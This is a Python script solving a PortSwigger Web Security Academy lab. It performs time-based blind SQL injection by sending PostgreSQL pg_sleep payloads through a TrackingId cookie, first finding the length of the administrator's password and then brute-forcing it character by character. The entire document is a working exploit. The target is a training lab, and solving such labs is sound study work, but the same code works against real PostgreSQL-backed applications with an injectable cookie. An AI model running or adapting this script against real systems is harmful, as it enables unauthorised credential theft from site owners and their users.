# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

import requests
import string
import time
import urllib.parse


URL = "https://....web-security-academy.net"
TRACKING_ID = "..."
ALPHABET = string.digits + string.ascii_letters
password_length = 0
password = ''


# Determine the password length

while True:

    injection = urllib.parse.quote(f"'; SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username = 'administrator') = {password_length}) THEN pg_sleep(3) ELSE pg_sleep(0) END--")
    cookies = {
        "TrackingId": TRACKING_ID + injection
    }

    start_time = time.time()
    r = requests.get(url = URL, cookies = cookies)
    end_time = time.time()

    if end_time - start_time > 2.5:
        print('Password length: ', password_length)
        break
    else:
        print('Nope: ', password_length)
        password_length += 1


# Brute-force the password

while len(password) < password_length:

    for c in ALPHABET:

        injection = urllib.parse.quote(f"'; SELECT CASE WHEN ((SELECT SUBSTRING(password, {len(password) + 1}, 1) FROM users WHERE username = 'administrator') = '{c}') THEN pg_sleep(3) ELSE pg_sleep(0) END--")
        cookies = {
            "TrackingId": TRACKING_ID + injection
        }

        start_time = time.time()
        r = requests.get(url = URL, cookies = cookies)
        end_time = time.time()

        if end_time - start_time > 2.5:
            password += c
            print('Password: ', password)
            break
        else:
            print('Nope: ', c)

print("Final Password: ", password)
